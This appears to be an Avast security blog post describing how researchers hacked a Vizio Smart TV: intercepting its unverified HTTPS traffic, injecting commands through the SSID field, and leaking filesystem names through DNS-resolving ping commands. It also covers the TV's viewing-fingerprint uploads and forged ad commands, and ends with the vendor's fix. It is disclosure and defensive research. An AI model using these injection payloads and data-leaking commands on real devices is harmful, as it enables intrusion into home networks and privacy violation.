@@ -1,0 +1,167 @@
+The Anatomy of an IoT Hack
+
+
+
+
+
+
+
+
+
+
+
+Threat Intelligence Team, 11 November 2015
+
+Hackers could gain access to your home or office network through your Smart TV.Avast researchers Aaron McSorley, Ross Dickey, and Riley Seaman hacked a Vizio Smart TV to gain access to a home network, and here's what they found.
+ 
+
+The Internet is everywhere – in your TV, your light bulb, and even your refrigerator. We are now living in the world of the Internet of Things. With all of our physical devices connected to the Internet, it’s important to understand how someone might access your information or violate your privacy through these devices. As an example, we’ll walk through hacking a Smart TV with the intention of gaining access to the victim’s home network, as well as to illustrate the privacy implications of having Internet-connected devices in your home or office.
+
+Through this experiment, our aim is to show just how much a regular person can be affected by vulnerabilities within a smart device. Throughout our journey, we went through a series of processes that involved (but were not limited to) a simulated Man-in-the-Middle (MITM) attack, the injection of an SSID, and the decoding of the device’s binary stream. We dove straight in, making our way through many avenues and curves with the ultimate goal to “crack the salt” (more on that later).
+In the end, we found that the smart TV we were inspecting actually broadcasted fingerprints of users’ activities, whether they agreed to the device’s privacy policy and terms of services when first setting it up. In addition, we uncovered a vulnerability within the device that could serve as a potential attack vector for an attacker attempting to access a user’s home network. Since this all sounds pretty creepy, it’s important to note that Vizio successfully resolved these issues upon being notified of our findings. Now, onto the experiment we go:
+Discovery
+In our IoT research lab, we have a wall of Smart TVs that are all connected to a wireless access point on a test network. All Internet activity on this test network is routed through a system which captures all of the raw traffic on the network. Using this, we can turn a Smart TV on, watch the packets in real time and save them for later analysis. We also have the capability to intercept and modify communications to and from the devices with this system.
+Upon powering up a Vizio Smart TV and adding it to our wireless test network, we can instantly see the TV sending Internet requests to various online services. These TVs have a lot of add-on apps which can trigger a ton of traffic (Youtube, Vudu, Netflix, etc.). However, for our purposes, we want to keep it simple and find a hack that works regardless of whether the victim is using an online service. Something that stands out with this TV is that it calls out to a service every time it boots, even if the TV is set to watch over the air broadcasts. There is an HTTPS connection to something at tvinteractive.tv. Not much can be seen in our network capture files at this point because the connection is encrypted with SSL.
+Know Your Enemy*
+The next thing to do is some research on tvinteractive.tv --this will help decide how much effort to spend on this interesting piece of traffic. Running a WHOIS search on the domain leads us to Cognitive Networks. On the services page for Cognitive networks is a quick rundown of how their service works:
+
+“As the viewer watches a show, content is ingested to create fingerprints. Our [service] identifies the content and time code. We send an event trigger to the content provider or advertiser. They send back a link to the app to display onscreen.”
+
+So, the TV is sending fingerprints of what you’re watching back to Cognitive Networks. This is a target worthy of further investigation.
+Be Your Enemy
+We want to know what information is being sent to tvinteractiv.tv, but, that connection is using an encrypted protocol. Fortunately, we have a system in place that we can use to intercept the traffic, simulating a man-in-the-middle attack over the Internet. On this system, we configure an authoritive DNS server for the tvinteractive.tv domain (simulating ARP poisioning/spoofing on the Internet) and configure a simple web host for any sites the TV is requesting from that domain. With this, we can see the complete URL for what the TV is requesting in the logs of our fake web server. If we’re lucky, the TV won’t check the certificate of the HTTPS connection and we can fake out the data as well.
+Get Lucky*
+Now, we arrive at a mistake for Vizio and good luck for us: the TV does not appear to be checking the HTTPS certificate for control.tvinteractive.tv. This means we can man-in-the-middle the connection, watch the requests, repeat them to the server, and serve our own fake (static) content back to the TV. 15 seconds after powering it on,we see an interesting request from the TV providing some information like the model of TV, origin of user, and firmware version.
+https://control.tvinteractive.tv/control?token=**redacted**&h=**redacted**&oem=VIZIO&chipset=MSERIES&chip_sub=5580-0&version=83&TOS=105&country=USA&lang=eng&fw_version=V1.60.32.0000&model_name=E32h-C1&client_version=2.6.27&disabled=0
+The TV is requesting control data from tvinteractive.tv and it has a number of interesting things to investigate. It also has a checksum as the last line of the control data. As it turns out, the TV is not checking the certificate of the connection, but it is checking the checksum at the end of the data before it will use the data. We can serve this control data to the TV from our fake web server, but we cannot change the data without breaking the checksum. The checksum is md5, and we assume the control data is combined with a secret to generate the checksum. In the field of cryptography this type of secret key is referred to as “salt”, we will use the terms salt and secret key interchangeably.
+A snippet of the control data:
+[control]
+detectionOn = 0
+nextUpdate = 1200000
+now = 1439335614846
+tvID = **redacted**
+...
+...
+…
+[network]
+udpReadTimeout = 10
+udpPort = 5558
+statusServerAddr = https://events2.tvinteractive.tv/events/vizio_mtk55xx_prod/
+sendSnappyUdp = 0
+udpReadTries = 50
+httpPort = 8080
+httpServerAddr = http://g2-ip.tvinteractive.tv/
+sendCompressed = 0
+sendudp = 1
+serverURLFormat = %s%s/?id=%s&token=%s
+udpServerAddr = 54.**redacted**
+sendhttp = 0
+frameUploadURL = https://smrtvdt01.tvinteractive.tv
+6e18d753e812fcadd64b211a939309e9
+Crack the Salt
+We remove as much as we can from the control data request URL to get the shortest control data, which will still give a checksum:
+https://control-default.tvinteractive.tv/control?token=**redacted**&h=**redacted**&oem=anything
+returns:
+[control]
+nextUpdate = 1200000
+d5a035c03b4bce761ba9400e8b56d227
+Operating under the hypothesis that the algorithm is either md5(body + salt), hmac-md5(body, key=salt) or some other common variation, we run a number of cracking utilities and hardware in an attempt to crack the salt. After a good amount of effort, we conclude that this is not something that can be brute-forced in a reasonable amount of time.
+Get Lucky Again*
+Since the salt is hidden within the device, the only way to get to the salt is to gain access to the file system of the TV. A port scan doesn’t turn up much of anything immediately useful, as far as gaining a root shell to the TV. We could unscrew the case from the TV and probe for a serial UART connection. Or, get lucky again and find a local command injection in the configuration dialogs builtin to the TV. The best candidate for this is a screen that allows input of every character to configure a hidden wireless network ID, the SSID. Assuming reboot is a command the underlying operating system will accept, we inject:
+$(reboot)
+as the SSID, and hit the connect button. The TV immediately goes black, confirming that we have a local command injection.
+At this point, we know that we can execute commands but are blind to what commands and files are available, as there is no terminal or output that we have access to. The only visibility is on the network capture, meaning that we need to guess at the commands available on the system. Telnet, ssh, netcat, and various other things we tried turned up nothing. However, when running ping from the command injection, an icmp packet can be seen on the network:
+`ping -c1 [ip address]`
+This proves the ping command is available. So, we decide to leak information about the operating system through ping. We weren’t quite sure how to do this, and quickly found a limitation of this attack: the SSID is limited to 32 characters. Since we need two backticks, that left us 30 characters for the actual command that we wanted to run. However, pinging a name...
+`ping -c1 somename`
+`ping -c1 $(which sh)`
+...would of course trigger a DNS lookup viewable in the pcaps:
+1269.728127 10.6.12.230 -> 10.6.12.223 DNS 85 Standard query 0x54ce A somename.test.network
+1269.728127 10.6.12.230 -> 10.6.12.223 DNS 85 Standard query 0x54ce A /bin/sh.test.network
+We now have a way of leaking arbitrary data, one word at a time. After some trial and error (mostly error), we found that injecting:
+`find / -exec ping -c1 {} \;`
+tells the TV to ping every file and directory name as a host on the network, allowing the file system structure to be extrapolated from the network capture as the TV tries to resolve everything in the file system as a DNS name:
+...
+2745.622059 10.6.12.230 -> 10.6.12.223 DNS 86 Standard query 0x18ff A /usr/bin.test.network
+2745.622277 10.6.12.223 -> 10.6.12.230 DNS 142 Standard query response 0x18ff No such name
+2745.631939 10.6.12.230 -> 10.6.12.223 DNS 90 Standard query 0x18dc A /usr/bin/cli.test.network
+2745.632135 10.6.12.223 -> 10.6.12.230 DNS 146 Standard query response 0x18dc No such name
+2745.643741 10.6.12.230 -> 10.6.12.223 DNS 90 Standard query 0x7337 A /usr/bin/ldd.test.network
+2745.643948 10.6.12.223 -> 10.6.12.230 DNS 146 Standard query response 0x7337 No such name
+2745.653493 10.6.12.230 -> 10.6.12.223 DNS 79 Standard query 0x7286 A /usr/bin/suspend.sh
+2745.719074 10.6.12.223 -> 10.6.12.230 DNS 145 Standard query response 0x7286 No such name
+2745.720615 10.6.12.230 -> 10.6.12.223 DNS 97 Standard query 0xc6b6 A /usr/bin/suspend.sh.test.network
+2745.720822 10.6.12.223 -> 10.6.12.230 DNS 153 Standard query response 0xc6b6 No such name
+2745.729597 10.6.12.230 -> 10.6.12.223 DNS 95 Standard query 0xa75b A /usr/bin/usb_path.test_network
+...
+Running various other commands this way, the output can be extrapolated from the network capture. For example:
+`mount|xargs -n1 ping -c1`
+gives all the mounts in the system. So, we can run the mount command without -- and then with -- a USB stick plugged in to see where it’s automounted.
+With the filesystem, we know what commands are available and can copy the entire filesystem to a USB stick or put a script (and a few binaries) onto the stick and run a reverse root shell back to our server. The TV is pwn’d.
+Find the Salt
+Searching every file in the filesystem for the string “tvinteractive.tv” returns an interesting library. Loading the binary into a decompiler or running the “strings” command against the binary reveals the secret key. Discovering the key is left as an exercise to the reader. From here, it’s a simple matter of appending the secret key to the modified control data, producing an md5 checksum of that, and appending the checksum to the modified control data (without the secret key).
+Assuming Control*
+A quick test of changing one of the URLs in the control data, regenerating the signature, and serving it from our fake web server works. Now, it’s time to play. Recall that there are some things to flip on and off in the network section of the control data:
+[network]
+...
+udpPort = 5558
+statusServerAddr = https://events2.tvinteractive.tv/events/vizio_mtk55xx_prod/
+...
+httpServerAddr = http://g2-ip.tvinteractive.tv/
+sendudp = 1
+udpServerAddr = 54.**redacted**
+sendhttp = 0
+frameUploadURL = https://smrtvdt01.tvinteractive.tv
+It appears that some sort of UDP upload is enabled by default, but not HTTP. Changing the IP to our own server and setting up a listener reveals that it’s simply a binary blob, sent every second or so. Here are two consecutive samples, in hex format:
+0200978c020002001700XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX04008591f423960080634a754b2f301a09251509787a75b7c0b18b5e44302714733a30987c569ea0913c48573e332ca4a29d775f7698887392a5bd92857f9c2e28665d5bc1a31752627adae8e430241b514943-80634a784d33301a0924140972746fbcc4b699674e2f2713743c30997d569fa4973c48583e3a3ca5a29e785f779a887494a6bf73554a804c49645f5dc2a41765768fdae6e232120a52473f010053020058050200380401000101000202000000
+0200988c020001001700XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX04006395f4234b0081634b754830301a095d3318575852d1ccb29363482d210f8c644b977e56c4d1c64939303a2310a78e83847f8095877892a4b89c9b959f2d297f7d7cc9ab1c1d2120312e25786650151a10010053020058050200380401000101000202000000
+These are not immediately recognizable to us. There are interesting patterns, but we don’t know what they mean.
+So, back in the control data, we switch the URL to one of our web servers, configure it, flip “sendhttp” to 1, and watch the web server logs. The TV begins sending requests about once a second:
+10.6.12.230 - - [12/Aug/2015:12:08:16 -0500] "GET /?token=**redacted**&seq_num=35991&width=1368&height=1080&versionNum=83&time=1439417275277&point=128-99-74,117-75-47,48-26-9,37-21-9,120-122-117,183-192-177,139-94-68,48-39-20,115-58-48,152-124-86,158-160-145,60-72-87,62-51-44,164-162-157,119-95-118,152-136-115,146-165-189,146-133-127,156-46-40,102-93-91,193-163-23,82-98-122,218-232-228,48-36-27,81-73-67,|128-99-74,120-77-51,48-26-9,36-20-9,114-116-111,188-196-182,153-103-78,47-39-19,116-60-48,153-125-86,159-164-151,60-72-88,62-58-60,165-162-158,120-95-119,154-136-116,148-166-191,115-85-74,128-76-73,100-95-93,194-164-23,101-118-143,218-230-226,50-18-10,82-71-63,| HTTP/1.1" 403 168 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3"
+10.6.12.230 - - [12/Aug/2015:12:08:17 -0500] "GET /?token=**redacted**&seq_num=35992&width=1368&height=1080&versionNum=83&time=1439417276264&point=129-99-75,117-72-48,48-26-9,93-51-24,87-88-82,209-204-178,147-99-72,45-33-15,140-100-75,151-126-86,196-209-198,73-57-48,58-35-16,167-142-131,132-127-128,149-135-120,146-164-184,156-155-149,159-45-41,127-125-124,201-171-28,29-33-32,49-46-37,120-102-80,21-26-16,| HTTP/1.1" 403 168 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3"
+ 
+ This graphic represents a fingerprint of what you’re watching over time. Each line of pixels represents a second in time.
+Interesting, say we. The “point” parameter appears to be an array of colors in RGB format using 8-bit color codes. Since the UDP packets and HTTP requests are sent at about the same frequency and size, we hypothesize that they may contain the same data.
+So, we get to work decoding the binary stream, using the HTTP stream as a decryption oracle (or, a source of truth) for the binary stream. We soon discover that there are parts of the binary stream that line up exactly with the HTTP data (with only a few unknown bytes) as approximately so (with fields labeled with their HTTP parameter names, except count):
+[seq_num][count][?][token][timestamp][point][versionNum][width][height][?][EOM]
+From this, it is obvious that the same data is being sent to Cognitive Networks servers through UDP and HTTP. This data is the fingerprint of what you’re watching being sent through the Internet to Cognitive Networks. This data is sent regardless of whether you agree to the privacy policy and terms of service when first configuring the TV.
+Now, these points aren’t the full picture of what you’re watching. They are simply pre-defined points taken somewhere within the image viewable on the TV. Nevertheless, we can create a graphic representing this fingerprint over time, where each line of pixels represents a second in time, arranged top-to-bottom as oldest-to-newest:
+Each horizontal line of various color blocks in the graphic represents averaged patches of color that the TV has captured from specific points of the image displayed on the TV screen.
+Each successive line represents another capture in time. With this information, the content recognition service could match a record of these fingerprints from your TV screen to it’s own fingerprints of the broadcast to determine what you’re watching.
+Serving custom ads
+Once we had root on the TV, we have downloaded the whole filesystem to inspect it. With a reverse shell, finding an application responsible for the Active Content Recognition was easy. The ACR application binary was using a TVIS shared library to handle all ACR related communication. After reverse engineering the library, we were able to retrieve a command set that the TV expects in the UDP packet.
+The library authors actually tried to ensure some level of security in the way they serve the commercials and they decided to use two basic methods: encryption and timestamping. Encryption sounds great, right? Well, don’t get too excited. There are two caveats to this. First, the (symmetric) encryption key is sent with the control data in plain text and second, if the key is empty, the encryption turns off.
+The timestamping was meant to avoid replay attacks, but as we reverse-engineered the simple timestamping algorithm and want to send our own ads, it presents no difficulty to bypass.
+So what commands are available? There are two commands that show an ad -- one to request the control data refresh and one to hide the current ad, as well as three additional commands to control some other features of the TV.
+We were interested in the popup event command, which is the simpler one of the two. In C, the function would have a prototype similar to this:
+popup_event(char group[5], char id[5], char channel[5], char EPGID[14], int64 time, char unk, uint32_t timestamp)
+Here, the group probably identifies the affiliate, id defines the ad within the affiliate space, channel is self-explanatory, EPGID represents the electronic program guide ID of the show (and is similar in function to the good old VHS times Showtime number), but there are places in the code where it is named as tribuneID. We were not able to fully understand the unk variable, but it works as a flag. The last parameter is the timestamp in the TVIS format -- basically a lower double word of current time of day in milliseconds.
+Once we served a crafted encrypted packet back to the TV as a reply to the UDP packet containing pixel/patch data, we verified that the packet is accepted by sending a refresh request. Once verified, we proceeded to make the TV show our commercial.
+Another crafted packet was sent, and we noticed the request for the following URL in our capture data:
+http://events2.tvinteractive.tv/events/vizio_mtk55xx_prod/1234/?id=5678&token=**redacted**)
+Obviously, the 1234 and 5678 are our testing group and id data. The TV expects an INI file as a response containing the commercial information. There are a few parameters specifying how long the ad should be displayed, what type of event it is, and so on. But there are several more interesting ones, such as alertPicUrl, alertActionUrl and type.
+Now, it is important to say that the application on the TV has minimal debug output and doesn’t show too much, although one can get an image of what's going on. But we wondered if it is possible to get more out of it, so we modified the binary to set a higher log level. This is not a permanent change, because the filesystem where the original binary resides is read-only. So, the modified one has to be run from the USB drive, but we could not persist this across reboots of the TV.
+Once we ran the modified binary, we got a huge amount of debug output, but we found that our alertPicUrl was successfully accepted and sent to the corresponding service. Unfortunately, we didn’t see any advertisement on the TV and have not yet determined the reason why. Further investigation is needed to demonstrate a proof of concept; however, this appears to be a potential attack vector for remotely displaying unwanted material on a person’s TV.
+What to do
+At this point, we have a possible attack vector into the home network or office through the Smart TV, which can be accomplished by hijacking DNS and serving malicious control data to the TV. Because the TV calls out to a control server by default and does not verify the authenticity of the control server, it allows an attacker in without the need for any incoming ports to be opened.
+Another thing we have is a privacy issue of fingerprints being sent to tvinteractive.tv. Fortunately, this Vizio Smart TV does have a setting to disable this behaviour:
+Menu -> Reset & Admin -> Smart Interactivity -> OFF’
+How to stay safe
+Allow the TV to update its system software. Upon notification of our findings, Vizio took immediate action to understand the issues, and produced a quick software update to fix them. By the time this blog is published, Vizio will be pushing an online update, provided that the TV is online, it should update itself. We’d like to commend Vizio for their responsiveness and quick action.
+Know Your Enemy
+Get Lucky
+Get Lucky Again
+Assuming Control
+
+
+
+Check 2 comments or write your comment
+
+
+
+
+
+
+
+
+
